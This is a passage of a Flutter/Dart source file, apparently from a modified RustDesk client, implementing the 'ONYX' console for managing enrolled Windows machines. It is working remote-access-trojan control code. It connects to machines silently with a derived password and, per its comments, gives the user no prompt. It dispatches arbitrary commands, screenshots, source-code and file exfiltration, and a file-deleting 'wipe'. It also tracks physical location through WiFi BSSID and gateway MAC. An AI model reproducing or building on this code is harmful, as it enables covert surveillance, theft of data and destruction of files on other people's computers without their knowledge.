import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter_hbb/common.dart';
import 'package:flutter_hbb/desktop/pages/onyx/onyx_api.dart';
import 'package:url_launcher/url_launcher.dart';

/// ONYX 标签页：设备列表 + 单机处置 + 静默远控。
///
/// 设计原则：
/// - 一台机器一屏，所有动作在这一屏里点完，不用来回切页面；
/// - 危险动作的确认框显示**实际会发出去的参数**，不是空泛的「确定吗」；
/// - 静默远控直接调 `connectMainDesktop`，带密码和强制中继，对方无任何提示。
class OnyxPage extends StatefulWidget {
  const OnyxPage({Key? key}) : super(key: key);

  @override
  State<OnyxPage> createState() => _OnyxPageState();
}

class _OnyxPageState extends State<OnyxPage> {
  static const Color _bg = Color(0xFF0D1117);
  static const Color _card = Color(0xFF161B22);
  static const Color _line = Color(0xFF21262D);
  static const Color _blue = Color(0xFF4C9AFF);
  static const Color _green = Color(0xFF3FB950);
  static const Color _red = Color(0xFFF85149);
  static const Color _dim = Color(0xFF8B95A1);
  static const Color _text = Color(0xFFE6E8EB);

  final TextEditingController _passCtrl = TextEditingController();
  final TextEditingController _searchCtrl = TextEditingController();

  /// 展开的任务卡片。默认全折叠 —— 一个采集任务能出几十条路径，
  /// 全部铺开会把整页撑爆，什么都看不见。
  final Set<String> _openTasks = {};

  bool _busy = false;
  String _error = '';
  Map<String, dynamic> _summary = {};
  List<Map<String, dynamic>> _devices = [];
  Map<String, dynamic>? _selected;
  Map<String, dynamic>? _detail;
  /// 网络指纹 + 同网关联（action=geo）。IP 只到城市，BSSID / 网关 MAC 才能到楼、能串人。
  Map<String, dynamic>? _geo;
  String _filter = '';

  @override
  void initState() {
    super.initState();
    if (OnyxApi.hasToken) {
      _refresh();
    }
  }

  @override
  void dispose() {
    _passCtrl.dispose();
    _searchCtrl.dispose();
    super.dispose();
  }

  Future<void> _refresh() async {
    setState(() {
      _busy = true;
      _error = '';
    });
    try {
      final summary = await OnyxApi.summary();
      final devices = await OnyxApi.devices();
      if (!mounted) return;
      setState(() {
        _summary = summary;
        _devices = devices;
        _busy = false;
      });
      final sel = _selected;
      if (sel != null) {
        await _select(sel['hwid'].toString(), silent: true);
      }
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _busy = false;
        _error = _clean(e);
      });
    }
  }

  Future<void> _login() async {
    setState(() {
      _busy = true;
      _error = '';
    });
    try {
      await OnyxApi.login(_passCtrl.text);
      _passCtrl.clear();
      await _refresh();
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _busy = false;
        _error = _clean(e);
      });
    }
  }

  Future<void> _select(String hwid, {bool silent = false}) async {
    if (!silent) setState(() => _busy = true);
    try {
      final d = await OnyxApi.device(hwid);
      if (!mounted) return;
      setState(() {
        _detail = d;
        _selected = (d['device'] as Map).cast<String, dynamic>();
        _busy = false;
        _error = '';
      });
      // 网络指纹是独立的接口，失败不能拖累设备详情
      _loadGeo(hwid);
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _busy = false;
        _error = _clean(e);
      });
    }
  }

  Future<void> _loadGeo(String hwid) async {
    try {
      final g = await OnyxApi.geo(hwid);
      if (!mounted) return;
      setState(() => _geo = g);
    } catch (_) {
      if (!mounted) return;
      setState(() => _geo = null);
    }
  }

  String _clean(Object e) =>
      e.toString().replaceFirst('Exception: ', '').trim();

  // ───────────────────────── 动作 ─────────────────────────

  Future<void> _silentRemote() async {
    final dev = _selected;
    if (dev == null) return;
    final id = (dev['remote_device_id'] ?? '').toString();
    final pwd = (dev['password'] ?? '').toString();
    if (id.isEmpty) {
      _snack('这台机器没上报 RustDesk ID，agent 可能是旧版');
      return;
    }
    if (pwd.isEmpty) {
      _snack('这台机器没上报卷序列号，算不出密码；可先下发「收集身份」或等它跑一次新启动器');
      return;
    }
    _snack('正在连接 $id …');
    await connectMainDesktop(
      id,
      isFileTransfer: false,
      isViewCamera: false,
      isTerminal: false,
      isTcpTunneling: false,
      isRDP: false,
      password: pwd,
      forceRelay: true,
    );
  }

  Future<void> _dispatch(String type, {Map<String, dynamic> params = const {}}) async {
    final dev = _selected;
    if (dev == null) return;
    final hwid = dev['hwid'].toString();
    final label = OnyxApi.taskLabels[type] ?? type;
    final ok = await _confirm(
      '下发「$label」',
      '目标：${_deviceTitle(dev)}\n参数：${params.isEmpty ? '{}' : _pretty(params)}',
      danger: type == 'wipe' || type == 'exec',
    );
    if (!ok) return;
    if (type == 'wipe') {
      final again = await _confirm(
        '格机二次确认',
        '这是不可逆操作。确认要对 ${_deviceTitle(dev)} 执行 wipe？',
        danger: true,
      );
      if (!again) return;
    }
    try {
      final taskId = await OnyxApi.dispatchTask(hwid, type, params: params);
      _snack('已下发「$label」 $taskId');
      await _select(hwid, silent: true);
    } catch (e) {
      _snack('下发失败：${_clean(e)}');
    }
  }

  // ─────────────────── 格机（两步：上膛 → 确认） ───────────────────
  //
  // 协议要求两条独立任务：arm 只记录目标并回 token，confirm 带 token 才真正删。
  // token 由 agent 侧 sha256(arm_task_id|hwid) 生成，客户端算不出来也不用算，
  // 但必须等 agent 轮询回报（约 25 秒一次）才能拿到，所以要轮询等待。
  Future<void> _wipeFlow() async {
    final dev = _selected;
    if (dev == null) return;
    final hwid = dev['hwid'].toString();

    final plan = await _askWipePlan(dev);
    if (plan == null || plan.paths.isEmpty) return;

    if (!await _confirm(
      '下发「格机」',
      '目标：${_deviceTitle(dev)}\n\n将删除以下路径：\n${plan.paths.join('\n')}\n\n'
          '执行后关机：${plan.shutdown ? '是（30 秒倒计时）' : '否'}',
      danger: true,
    )) return;
    if (!await _confirm(
      '格机二次确认',
      '这是不可逆操作，删除后无法恢复。确认对 ${_deviceTitle(dev)} 执行？',
      danger: true,
    )) return;

    try {
      final armId = await OnyxApi.dispatchTask(hwid, 'wipe', params: {
        'phase': 'arm',
        'paths': plan.paths,
        'shutdown': plan.shutdown,
      });
      _snack('已上膛 $armId，等待 agent 回 token（约 25~60 秒）…');

      final armTask = await _waitTask(hwid, armId);
      if (armTask == null) {
        _snack('75 秒内没等到上膛结果，格机已取消');
        return;
      }
      final arm = _jsonOf(armTask['result_message']);
      if (arm == null || arm['ok'] != true) {
        _snack('上膛被拒绝：${arm?['error'] ?? armTask['result_message']}');
        return;
      }
      final token = (arm['token'] ?? '').toString();
      if (token.isEmpty) {
        _snack('上膛没返回 token，格机已取消');
        return;
      }

      final okId = await OnyxApi.dispatchTask(hwid, 'wipe',
          params: {'phase': 'confirm', 'token': token});
      _snack('已下发确认 $okId，等待执行结果…');

      final doneTask = await _waitTask(hwid, okId);
      final res = doneTask == null ? null : _jsonOf(doneTask['result_message']);
      if (res != null && res['ok'] == true) {
        final failed = (res['failed'] as List?)?.length ?? 0;
        _snack('格机完成：删除 ${res['deleted']} 项，失败 $failed 项');
      } else {
        _snack('确认阶段返回：${res?['error'] ?? doneTask?['result_message'] ?? '无结果'}');
      }
      await _select(hwid, silent: true);
    } catch (e) {
      _snack('格机失败：${_clean(e)}');
    }
  }

  /// 让操作员编辑目标路径；默认按 collect_identity 回报的用户目录填。
  /// 关机是**可选**的，默认关闭 —— 删文件不需要顺手把机器关了。
  Future<_WipePlan?> _askWipePlan(Map<String, dynamic> dev) async {
    final ctrl = TextEditingController(text: _defaultWipePaths(dev).join('\n'));
    var shutdown = false;
    return showDialog<_WipePlan>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setLocal) => AlertDialog(
          backgroundColor: _card,
          title: const Text('格机目标路径',
              style: TextStyle(color: _text, fontSize: 16)),
          content: SizedBox(
            width: 520,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                    r'每行一个路径。C:\Windows、C:\Users、C:\Program Files 等受保护路径会被 agent 直接拒绝。',
                    style: TextStyle(color: _dim, fontSize: 12)),
                const SizedBox(height: 8),
                TextField(
                  controller: ctrl,
                  maxLines: 8,
                  cursorColor: _blue,
                  style: const TextStyle(
                      color: _text, fontSize: 13, height: 1.5),
                  decoration: InputDecoration(
                    filled: true,
                    fillColor: _bg,
                    isDense: true,
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 10, vertical: 10),
                    enabledBorder: OutlineInputBorder(
                      borderSide: BorderSide(color: _dim.withOpacity(0.45)),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderSide: BorderSide(color: _blue),
                    ),
                  ),
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Checkbox(
                      value: shutdown,
                      activeColor: const Color(0xFFE5484D),
                      onChanged: (v) => setLocal(() => shutdown = v ?? false),
                    ),
                    const Expanded(
                      child: Text('执行完成后关机（30 秒倒计时）',
                          style: TextStyle(color: _text, fontSize: 13)),
                    ),
                  ],
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('取消', style: TextStyle(color: _dim)),
            ),
            TextButton(
              onPressed: () {
                final paths = ctrl.text
                    .split(RegExp(r'[\r\n]+'))
                    .map((e) => e.trim())
                    .where((e) => e.isNotEmpty)
                    .toList();
                Navigator.pop(ctx, _WipePlan(paths, shutdown));
              },
              child:
                  const Text('下一步', style: TextStyle(color: Color(0xFFE5484D))),
            ),
          ],
        ),
      ),
    );
  }

  /// 默认路径：优先用最近一次 collect_identity 回报的真实用户目录。
  /// 注意只取 Desktop / Temp 这类用户级垃圾目录，**不默认整个用户配置目录** ——
  /// 格机不可逆，默认值必须保守，要删整个 profile 得操作员自己加。
  List<String> _defaultWipePaths(Map<String, dynamic> dev) {
    final homes = <String>[];
    final tasks = (_detail?['tasks'] as List?) ?? const [];
    for (final t in tasks) {
      final m = (t as Map).cast<String, dynamic>();
      if (m['type'] != 'collect_identity') continue;
      final raw = _jsonOf(m['result_message'])?['profile_users'];
      if (raw is List) {
        for (final p in raw) {
          final s = p.toString().trim();
          if (s.isEmpty || s.toLowerCase().contains('systemprofile')) continue;
          if (!homes.contains(s)) homes.add(s);
        }
      }
      if (homes.isNotEmpty) break;
    }

    final out = <String>[];
    for (final h in homes) {
      out.add('$h\\Desktop');
      out.add('$h\\AppData\\Local\\Temp');
    }
    if (out.isEmpty) {
      out.addAll([
        r'C:\Users\Administrator\Desktop',
        r'C:\Users\Administrator\AppData\Local\Temp',
      ]);
    }
    out.add(r'C:\ProgramData\Onyx');
    return out;
  }

  /// 轮询设备详情，等某条任务落到终态。
  Future<Map<String, dynamic>?> _waitTask(String hwid, String taskId,
      {Duration timeout = const Duration(seconds: 75)}) async {
    final deadline = DateTime.now().add(timeout);
    while (DateTime.now().isBefore(deadline)) {
      await Future.delayed(const Duration(seconds: 3));
      if (!mounted) return null;
      try {
        final d = await OnyxApi.device(hwid);
        final list = (d['tasks'] as List?) ?? const [];
        for (final t in list) {
          final m = (t as Map).cast<String, dynamic>();
          if (m['task_id']?.toString() != taskId) continue;
          final st = m['status']?.toString() ?? '';
          if (st == 'done' || st == 'failed' || st == 'expired') return m;
        }
      } catch (_) {
        // 网络抖动就继续等
      }
    }
    return null;
  }

  Map<String, dynamic>? _jsonOf(Object? raw) {
    if (raw == null) return null;
    final s = raw.toString().trim();
    if (s.isEmpty) return null;
    try {
      final v = jsonDecode(s);
      return v is Map ? v.cast<String, dynamic>() : null;
    } catch (_) {
      return null;
    }
  }

  Future<void> _dispatchWithInput(String type) async {
    final dev = _selected;
    if (dev == null) return;
    final ctrl = TextEditingController(
      text: type == 'exec'
          ? '{"cmd":"whoami"}'
          : type == 'collect_file'
              ? '{"path":"C:\\\\Windows\\\\win.ini"}'
              : type == 'collect_tree'
                  ? '{"path":"C:\\\\Users"}'
                  : '{}',
    );
    final text = await showDialog<String>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: _card,
        title: Text(OnyxApi.taskLabels[type] ?? type,
            style: const TextStyle(color: _text, fontSize: 16)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(OnyxApi.taskHints[type] ?? '',
                style: const TextStyle(color: _dim, fontSize: 12)),
            const SizedBox(height: 10),
            TextField(
              controller: ctrl,
              maxLines: 4,
              style: const TextStyle(color: _text, fontSize: 13),
              decoration: const InputDecoration(
                filled: true,
                fillColor: _bg,
                border: OutlineInputBorder(),
                isDense: true,
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('取消', style: TextStyle(color: _dim))),
          TextButton(
              onPressed: () => Navigator.pop(ctx, ctrl.text),
              child: const Text('下发', style: TextStyle(color: _blue))),
        ],
      ),
    );
    if (text == null) return;
    Map<String, dynamic> params;
    try {
      final t = text.trim();
      final v = t.isEmpty ? <String, dynamic>{} : jsonDecode(t);
      params = (v is Map) ? v.cast<String, dynamic>() : {'value': v};
    } catch (_) {
      _snack('参数不是合法 JSON');
      return;
    }
    await _dispatch(type, params: params);
  }

  Future<void> _ban(String username, bool ban) async {
    final dev = _selected;
    if (dev == null) return;
    final ok = await _confirm(
      ban ? '封禁「$username」' : '解封「$username」',
      '账号：$username\n设备：${_deviceTitle(dev)}',
      danger: ban,
    );
    if (!ok) return;
    try {
      await OnyxApi.ban(username, ban);
      _snack(ban ? '已封禁「$username」' : '已解封「$username」');
      await _select(dev['hwid'].toString(), silent: true);
    } catch (e) {
      _snack('操作失败：${_clean(e)}');
    }
  }

  Future<void> _openArtifact(int id, {bool download = false}) async {
    final url = OnyxApi.artifactUrl(id, download: download);
    final uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      _snack('打不开：$url');
    }
  }

  Future<bool> _confirm(String title, String body, {bool danger = false}) async {
    final r = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: _card,
        title: Text(title,
            style: TextStyle(color: danger ? _red : _text, fontSize: 16)),
        content: Text(body,
            style: const TextStyle(color: _text, fontSize: 13, height: 1.6)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(ctx, false),
              child: const Text('取消', style: TextStyle(color: _dim))),
          TextButton(
              onPressed: () => Navigator.pop(ctx, true),
              child: Text(danger ? '确认执行' : '确定',
                  style: TextStyle(color: danger ? _red : _blue))),
        ],
      ),
    );
    return r ?? false;
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context)
      ..clearSnackBars()
      ..showSnackBar(SnackBar(
        content: Text(msg, style: const TextStyle(fontSize: 13)),
        duration: const Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
      ));
  }

  String _pretty(Object v) {
    try {
      return const JsonEncoder.withIndent('  ').convert(v);
    } catch (_) {
      return v.toString();
    }
  }

  // ───────────────────────── UI ─────────────────────────

  @override
  Widget build(BuildContext context) {
    if (!OnyxApi.hasToken) return _buildLogin();
    return Scaffold(
      backgroundColor: _bg,
      body: Column(
        children: [
          _buildTopBar(),
          if (_error.isNotEmpty) _buildError(),
          Expanded(
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                SizedBox(width: 360, child: _buildDeviceList()),
                const VerticalDivider(width: 1, color: _line),
                Expanded(child: _buildDetail()),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLogin() {
    return Scaffold(
      backgroundColor: _bg,
      body: Center(
        child: Container(
          width: 360,
          padding: const EdgeInsets.all(28),
          decoration: BoxDecoration(
            color: _card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _line),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Text('ONYX 控制台',
                  style: TextStyle(
                      color: _text, fontSize: 20, fontWeight: FontWeight.w600)),
              const SizedBox(height: 6),
              const Text('用后台管理员密码登录',
                  style: TextStyle(color: _dim, fontSize: 12)),
              const SizedBox(height: 20),
              TextField(
                controller: _passCtrl,
                obscureText: true,
                onSubmitted: (_) => _login(),
                style: const TextStyle(color: _text),
                decoration: InputDecoration(
                  hintText: '管理员密码',
                  hintStyle: const TextStyle(color: _dim, fontSize: 13),
                  filled: true,
                  fillColor: _bg,
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(8),
                      borderSide: BorderSide.none),
                  isDense: true,
                  contentPadding:
                      const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
                ),
              ),
              const SizedBox(height: 14),
              SizedBox(
                height: 42,
                child: ElevatedButton(
                  onPressed: _busy ? null : _login,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _blue,
                    foregroundColor: Colors.white,
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(8)),
                  ),
                  child: _busy
                      ? const SizedBox(
                          width: 18,
                          height: 18,
                          child: CircularProgressIndicator(
                              strokeWidth: 2, color: Colors.white))
                      : const Text('登录'),
                ),
              ),
              if (_error.isNotEmpty) ...[
                const SizedBox(height: 12),
                Text(_error,
                    style: const TextStyle(color: _red, fontSize: 12)),
              ],
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildTopBar() {
    return Container(
      height: 52,
      padding: const EdgeInsets.symmetric(horizontal: 16),
      decoration: const BoxDecoration(
        color: _card,
        border: Border(bottom: BorderSide(color: _line)),
      ),
      child: Row(
        children: [
          const Text('ONYX',
              style: TextStyle(
                  color: _text, fontSize: 15, fontWeight: FontWeight.w700,
                  letterSpacing: 1)),
          const SizedBox(width: 16),
          _chip('在线', _summary['online_devices']?.toString() ?? '-', _green),
          _chip('设备', _summary['devices']?.toString() ?? '-', _blue),
          _chip('今日风险', _summary['risk_today']?.toString() ?? '-', _red),
          _chip('未推送', _summary['alert_pending']?.toString() ?? '-', _dim),
          const Spacer(),
          IconButton(
            tooltip: '刷新',
            onPressed: _busy ? null : _refresh,
            icon: _busy
                ? const SizedBox(
                    width: 16,
                    height: 16,
                    child: CircularProgressIndicator(strokeWidth: 2))
                : const Icon(Icons.refresh, size: 18, color: _dim),
          ),
          IconButton(
            tooltip: '退出登录',
            onPressed: () {
              OnyxApi.logout();
              setState(() {
                _devices = [];
                _detail = null;
                _selected = null;
                _summary = {};
              });
            },
            icon: const Icon(Icons.logout, size: 18, color: _dim),
          ),
        ],
      ),
    );
  }

  Widget _chip(String label, String value, Color color) {
    return Padding(
      padding: const EdgeInsets.only(right: 14),
      child: Row(
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(color: color, shape: BoxShape.circle),
          ),
          const SizedBox(width: 6),
          Text('$label $value',
              style: const TextStyle(color: _dim, fontSize: 12)),
        ],
      ),
    );
  }

  Widget _buildError() {
    return Container(
      width: double.infinity,
      color: _red.withOpacity(0.12),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      child: Text(_error, style: const TextStyle(color: _red, fontSize: 12)),
    );
  }

  Widget _buildDeviceList() {
    final list = _devices.where((d) {
      if (_filter.isEmpty) return true;
      final f = _filter.toLowerCase();
      final users = (d['users'] as List?)?.join(' ').toLowerCase() ?? '';
      return d['hwid'].toString().toLowerCase().contains(f) ||
          users.contains(f) ||
          (d['computer_name'] ?? '').toString().toLowerCase().contains(f);
    }).toList();

    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.all(10),
          child: TextField(
            controller: _searchCtrl,
            onChanged: (v) => setState(() => _filter = v.trim()),
            style: const TextStyle(color: _text, fontSize: 13),
            decoration: InputDecoration(
              hintText: '搜账号 / 机器名 / HWID',
              hintStyle: const TextStyle(color: _dim, fontSize: 12),
              prefixIcon: const Icon(Icons.search, size: 16, color: _dim),
              filled: true,
              fillColor: _card,
              isDense: true,
              contentPadding: const EdgeInsets.symmetric(vertical: 10),
              border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide.none),
            ),
          ),
        ),
        Expanded(
          child: list.isEmpty
              ? const Center(
                  child: Text('没有设备',
                      style: TextStyle(color: _dim, fontSize: 12)))
              : ListView.builder(
                  itemCount: list.length,
                  itemBuilder: (ctx, i) => _deviceRow(list[i]),
                ),
        ),
      ],
    );
  }

  Widget _deviceRow(Map<String, dynamic> d) {
    final online = d['online'] == true;
    final sel = _selected?['hwid'] == d['hwid'];
    final users = (d['users'] as List?)?.cast<String>() ?? [];
    final risk = (d['risk_events'] as num?)?.toInt() ?? 0;
    return InkWell(
      onTap: () => _select(d['hwid'].toString()),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        decoration: BoxDecoration(
          color: sel ? _blue.withOpacity(0.10) : Colors.transparent,
          border: const Border(bottom: BorderSide(color: _line, width: 0.5)),
        ),
        child: Row(
          children: [
            Container(
              width: 7,
              height: 7,
              decoration: BoxDecoration(
                color: online ? _green : _dim.withOpacity(0.5),
                shape: BoxShape.circle,
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: Text(
                          users.isEmpty ? d['hwid'].toString() : users.first,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(
                              color: _text,
                              fontSize: 13,
                              fontWeight: FontWeight.w500),
                        ),
                      ),
                      if (risk > 0)
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 5, vertical: 1),
                          decoration: BoxDecoration(
                            color: _red.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text('$risk',
                              style: const TextStyle(
                                  color: _red, fontSize: 10)),
                        ),
                    ],
                  ),
                  const SizedBox(height: 2),
                  Text(
                    '${users.length} 账号 · ${_ago(d['last_seen_ago'])}'
                    '${(d['password_ready'] == true) ? ' · 可远控' : ''}',
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    style: const TextStyle(color: _dim, fontSize: 11),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDetail() {
    final dev = _selected;
    if (dev == null) {
      return const Center(
        child: Text('左边选一台机器',
            style: TextStyle(color: _dim, fontSize: 13)),
      );
    }
    final tasks = ((_detail?['tasks'] as List?) ?? [])
        .map((e) => (e as Map).cast<String, dynamic>())
        .toList();
    final files = ((_detail?['files'] as List?) ?? [])
        .map((e) => (e as Map).cast<String, dynamic>())
        .toList();
    final accounts = ((_detail?['accounts'] as List?) ?? [])
        .map((e) => (e as Map).cast<String, dynamic>())
        .toList();

    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildHeader(dev),
        const SizedBox(height: 14),
        _buildActions(dev),
        const SizedBox(height: 16),
        _sectionTitle('账号'),
        ...accounts.map(_accountRow),
        const SizedBox(height: 16),
        _sectionTitle('网络与位置'),
        _geoPanel(),
        const SizedBox(height: 16),
        _sectionTitle('最近任务'),
        if (tasks.isEmpty)
          const Text('还没有任务', style: TextStyle(color: _dim, fontSize: 12))
        else
          ...tasks.take(10).map(_taskRow),
        const SizedBox(height: 16),
        _sectionTitle('取证文件'),
        if (files.isEmpty)
          const Text('还没有文件', style: TextStyle(color: _dim, fontSize: 12))
        else
          ...files.take(10).map(_fileRow),
      ],
    );
  }

  /// 网络与位置。
  /// 说实话的部分：IP 只能到城市（区县 55-70%，楼宇 0%）—— IP 是分配给 ISP 的，不是分配给房子的。
  /// 真正能到楼的是 WiFi BSSID（全球唯一的路由器 MAC，10-50 米）；
  /// 网关 MAC 用来判断「同一个路由器」，换账号换 IP 都甩不掉，是串人最稳的一把锁。
  Widget _geoPanel() {
    final g = _geo;
    final self = g?['self'];
    if (self is! Map) {
      return const Padding(
        padding: EdgeInsets.only(top: 4),
        child: Text('还没上报网络指纹（需要新版 agent 心跳一次，最长约 10 分钟）',
            style: TextStyle(color: _dim, fontSize: 11)),
      );
    }
    final m = self.cast<String, dynamic>();
    String s(String k) => (m[k] ?? '').toString();
    final byB = (g!['by_bssid'] as List?)?.length ?? 0;
    final byG = (g['by_gateway'] as List?)?.length ?? 0;
    final byI = (g['by_ip'] as List?)?.length ?? 0;
    final place = [s('region'), s('city')].where((e) => e.isNotEmpty).join(' ');

    Widget row(String k, String v, {Color c = _text}) => v.trim().isEmpty
        ? const SizedBox.shrink()
        : Padding(
            padding: const EdgeInsets.only(top: 4),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(
                    width: 52,
                    child: Text(k,
                        style: const TextStyle(color: _dim, fontSize: 11))),
                Expanded(
                    child: SelectableText(v,
                        style:
                            TextStyle(color: c, fontSize: 11, height: 1.5))),
              ],
            ),
          );

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        row('归属',
            [place, s('isp')].where((e) => e.isNotEmpty).join('  ·  ')),
        row('出口IP', s('ip')),
        row('WiFi',
            [s('wlan_ssid'), s('wlan_bssid')]
                .where((e) => e.isNotEmpty)
                .join('   '),
            c: _green),
        row('网关',
            [s('gateway_ip'), s('gateway_mac')]
                .where((e) => e.isNotEmpty)
                .join('   '),
            c: _green),
        Padding(
          padding: const EdgeInsets.only(top: 6),
          child: Text(
            byB + byG + byI > 0
                ? '同 WiFi $byB 台  ·  同路由器 $byG 台  ·  同出口IP $byI 台'
                : '暂无同网关联设备',
            style: TextStyle(
                color: byB + byG + byI > 0 ? _red : _dim, fontSize: 11),
          ),
        ),
        if (s('wlan_bssid').isEmpty && s('gateway_mac').isEmpty)
          const Padding(
            padding: EdgeInsets.only(top: 4),
            child: Text('这台没接 WiFi（台式机/网线），关联只能靠出口 IP，精度只到城市',
                style: TextStyle(color: _dim, fontSize: 10)),
          ),
      ],
    );
  }

  Widget _buildHeader(Map<String, dynamic> dev) {
    final users = (dev['users'] as List?)?.cast<String>() ?? [];
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _line),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Text(
                (dev['computer_name'] ?? '').toString().isEmpty
                    ? dev['hwid'].toString()
                    : dev['computer_name'].toString(),
                style: const TextStyle(
                    color: _text, fontSize: 15, fontWeight: FontWeight.w600),
              ),
              const SizedBox(width: 8),
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                decoration: BoxDecoration(
                  color: (dev['online'] == true ? _green : _dim)
                      .withOpacity(0.15),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  dev['online'] == true ? '在线' : '离线',
                  style: TextStyle(
                      color: dev['online'] == true ? _green : _dim,
                      fontSize: 10),
                ),
              ),
              if (dev['banned'] == true) ...[
                const SizedBox(width: 6),
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                  decoration: BoxDecoration(
                    color: _red.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: const Text('已封禁',
                      style: TextStyle(color: _red, fontSize: 10)),
                ),
              ],
            ],
          ),
          const SizedBox(height: 6),
          Text(
            '${dev['system_version'] ?? ''}',
            style: const TextStyle(color: _dim, fontSize: 11),
          ),
          const SizedBox(height: 2),
          Text(
            'HWID ${dev['hwid']}',
            style: const TextStyle(color: _dim, fontSize: 11),
          ),
          Text(
            'ID ${dev['remote_device_id'] ?? '-'} · IP ${dev['ip'] ?? '-'}'
            ' · ${_ago(dev['last_seen_ago'])}',
            style: const TextStyle(color: _dim, fontSize: 11),
          ),
          Text(
            '账号 ${users.join(' / ')}',
            style: const TextStyle(color: _dim, fontSize: 11),
          ),
        ],
      ),
    );
  }

  Widget _buildActions(Map<String, dynamic> dev) {
    final canRemote = dev['can_remote'] == true;
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: [
        _actionButton(
          canRemote ? '静默远控' : '静默远控（缺 ID/密码）',
          Icons.desktop_windows_outlined,
          canRemote ? _silentRemote : () => _snack('缺 RustDesk ID 或卷序列号'),
          primary: true,
          enabled: canRemote,
        ),
        _actionButton('扫源码', Icons.code, () => _dispatch('collect_src')),
        _actionButton('截屏', Icons.photo_camera_outlined,
            () => _dispatch('capture_screen')),
        _actionButton('收集身份', Icons.badge_outlined,
            () => _dispatch('collect_identity')),
        _actionButton('探活', Icons.network_ping, () => _dispatch('ping')),
        _actionButton('执行命令', Icons.terminal,
            () => _dispatchWithInput('exec')),
        _actionButton('取单个文件', Icons.insert_drive_file_outlined,
            () => _dispatchWithInput('collect_file')),
        _actionButton('取整个目录', Icons.folder_zip_outlined,
            () => _dispatchWithInput('collect_tree')),
        _actionButton('格机', Icons.dangerous_outlined, _wipeFlow, danger: true),
      ],
    );
  }

  Widget _actionButton(
    String label,
    IconData icon,
    VoidCallback onTap, {
    bool primary = false,
    bool danger = false,
    bool enabled = true,
  }) {
    final color = !enabled
        ? _dim.withOpacity(0.5)
        : danger
            ? _red
            : primary
                ? _blue
                : _text;
    return SizedBox(
      height: 34,
      child: OutlinedButton.icon(
        onPressed: enabled ? onTap : null,
        icon: Icon(icon, size: 14, color: color),
        label: Text(label, style: TextStyle(color: color, fontSize: 12)),
        style: OutlinedButton.styleFrom(
          side: BorderSide(
              color: primary || danger
                  ? color.withOpacity(0.5)
                  : _line),
          padding: const EdgeInsets.symmetric(horizontal: 12),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(7)),
          backgroundColor:
              primary || danger ? color.withOpacity(0.08) : Colors.transparent,
        ),
      ),
    );
  }

  Widget _sectionTitle(String t) => Padding(
        padding: const EdgeInsets.only(bottom: 8),
        child: Text(t,
            style: const TextStyle(
                color: _text, fontSize: 13, fontWeight: FontWeight.w600)),
      );

  Widget _accountRow(Map<String, dynamic> a) {
    final banned = (a['status'] as num?)?.toInt() == 0;
    return Container(
      margin: const EdgeInsets.only(bottom: 6),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: _card,
